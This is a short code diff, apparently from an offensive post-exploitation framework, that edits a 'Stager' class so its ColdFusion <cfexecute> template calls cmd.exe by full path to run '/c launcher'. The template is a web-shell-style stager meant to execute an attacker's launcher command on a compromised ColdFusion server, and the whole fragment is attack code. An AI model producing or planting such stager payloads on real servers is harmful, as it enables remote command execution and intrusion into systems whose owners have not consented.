@@ -85,7 +85,7 @@ class Stager:
             print helpers.color("[!] Error in launcher command generation.")
             return ""
 	else:
-			code = '''<cfexecute name = "%COMSPEC%"
+			code = '''<cfexecute name = "C:\Windows\system32\cmd.exe"
    				arguments = "/c launcher"
    				timeout = "10">
 				</cfexecute>
